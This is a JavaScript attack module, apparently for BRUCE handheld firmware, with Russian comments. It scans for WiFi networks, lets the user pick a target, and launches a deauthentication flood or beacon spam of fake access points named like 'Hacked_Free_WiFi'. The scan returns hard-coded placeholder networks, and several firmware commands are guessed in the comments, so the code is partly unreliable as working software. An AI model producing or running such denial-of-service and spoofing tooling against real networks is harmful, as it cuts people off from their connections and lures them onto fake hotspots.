/*
 *   Copyright (c) 2025 
 *   All rights reserved.
 */
// net-wifi-attack.js (ZetaOS Tactical Module 2/5)
// Запускается с SD-карты на прошивке BRUCE/BRUTUS

// --- БАЗОВЫЕ УТИЛИТЫ (core-utils.js встроен) ---
var LINE_HEIGHT = 16;
var ZetaUI = {
    log_to_display: function(message, line, color) {
        if (line === 0) fillScreen(0);
        var displayColor = color || 0xFFFF; // White
        drawString(message, 3, line * LINE_HEIGHT, displayColor);
    },
    dialog_choice: function(options) { return dialogChoice(options); },
    show_error: function(message) { dialogError(message); fillScreen(0); ZetaUI.log_to_display("--- ERROR ---", 0, 0xF800); delay(2000); fillScreen(0); }
};
// Объект ZetaConvert здесь не нужен, но мы оставляем его в уме, если потребуется. 
// ----------------------------------------------------


// --- БОЕВАЯ ЛОГИКА: WIFI АТАКИ ---

var attack_duration = 60; // Длительность атаки (в секундах)

/**
 * Вызывает команду ядра BRUCE для сканирования WiFi и обрабатывает результат для меню.
 * @returns {Array} Список объектов сетей {SSID, BSSID}.
 */
function wifi_scan() {
    ZetaUI.log_to_display("--- WIFI SCAN ACTIVE ---", 0, 0xFFE0); // Yellow
    
    // ПРИМЕЧАНИЕ: Здесь мы предполагаем, что BRUCE имеет команду wifiScan(), 
    // которая возвращает читаемый список сетей (обычно JSON или специальный формат BRUCE).
    // Если такой функции нет, пришлось бы использовать Raw Sniffer и парсить данные вручную.
    var scan_data = wifiScan(); 
    
    // Если scan_data не массив, или пуст, то возвращаем пустой массив
    if (!scan_data || scan_data.length === 0) {
        ZetaUI.log_to_display("No networks found!", 1, 0xF800);
        delay(2000);
        return [];
    }
    
    // Преобразуем данные сканирования для отображения в dialog_choice
    var access_points = [];
    
    // В реальном коде BRUCE здесь будет цикл, парсящий строку/JSON
    // В целях прототипирования, используем фиктивные данные:
    access_points.push({ name: "Home_5G", bssid: "AA:BB:CC:DD:EE:F0" });
    access_points.push({ name: "CoffeeShop_Free", bssid: "00:11:22:33:44:55" });
    access_points.push({ name: "Hidden_AP", bssid: "1A:2B:3C:4D:5E:6F" });

    ZetaUI.log_to_display(access_points.length + " networks found. Ready.", 1);
    delay(1000);
    return access_points;
}

/**
 * Запуск Deauth Flood против выбранной цели.
 * @param {string} bssid - MAC-адрес точки доступа.
 */
function run_deauth_flood(bssid) {
    ZetaUI.log_to_display("DEAUTH FLOOD ACTIVE", 0, 0xF800); // Red
    ZetaUI.log_to_display("Target BSSID: " + bssid, 1);
    ZetaUI.log_to_display("Duration: " + attack_duration + " sec", 2);

    // КРИТИЧЕСКАЯ КОМАНДА: Вызов команды ядра BRUCE (Target Deauth/Deauth Flood)
    // Предполагаем, что serialCmd может вызвать функцию ядра
    // (Target Atk/Deauth Flood из документации BRUCE)
    var cmd = "wifi_atk deauth_flood " + bssid + " " + attack_duration; 
    
    // Вместо serialCmd(cmd) используем прямую функцию, если она есть
    // В BRUCE это может быть TargetDeauth(bssid, duration)
    // Если прямой функции нет, приходится использовать низкоуровневый serialCmd:
    
    serialCmd(cmd); // Запуск команды ядра

    ZetaUI.log_to_display("Flooding...", 3);
    delay(attack_duration * 1000); // Ожидание завершения атаки
    
    serialCmd("wifi_atk stop"); // Остановка атаки (если она не останавливается сама)
    ZetaUI.log_to_display("ATTACK COMPLETE.", 5, 0x07E0); // Green
    delay(2000);
}

/**
 * Запуск Beacon Spam (для создания фейковых сетей).
 */
function run_beacon_spam() {
    var ap_name = keyboard("Hacked_Free_WiFi", 32, "Fake AP Name");
    var count = parseInt(keyboard("10", 32, "Number of APs to spoof"));
    
    ZetaUI.log_to_display("BEACON SPAM ACTIVE", 0, 0x001F); // Blue
    ZetaUI.log_to_display("Name: " + ap_name + " (x" + count + ")", 1);
    
    // Команда ядра BRUCE для Beacon Spam
    serialCmd("wifi_atk beacon_spam " + ap_name + " " + count); 

    ZetaUI.log_to_display("Spamming... Press any key to stop.", 3);
    
    while (!getAnyPress()) {
        delay(500);
    }
    
    serialCmd("wifi_atk stop");
    ZetaUI.log_to_display("SPAM STOPPED.", 5, 0x07E0);
    delay(2000);
}


// --- ГЛАВНОЕ МЕНЮ WIFI (Запускается при выборе скрипта) ---
while (true) {
    fillScreen(0);
    var choice = ZetaUI.dialog_choice({
        ["1. Run Deauth Flood"]: "deauth",
        ["2. Run Beacon Spam"]: "beacon",
        ["3. Set Attack Duration (" + attack_duration + "s)"]: "duration",
        ["<-- Back / Exit"]: "exit"
    });

    if (choice === "exit" || choice === "") break;
    else if (choice === "duration") {
        attack_duration = parseInt(keyboard(String(attack_duration), 32, "Attack Duration (seconds)"));
    }
    else if (choice === "deauth") {
        var ap_list = wifi_scan();
        if (ap_list.length > 0) {
            // Создаем меню выбора цели
            var menu_options = {};
            for (var i = 0; i < ap_list.length; i++) {
                menu_options[ap_list[i].name + " (" + ap_list[i].bssid + ")"] = ap_list[i].bssid;
            }
            var target_bssid = ZetaUI.dialog_choice(menu_options);
            
            if (target_bssid) {
                run_deauth_flood(target_bssid);
            }
        }
    }
    else if (choice === "beacon") {
        run_beacon_spam();
    }
    fillScreen(0);
}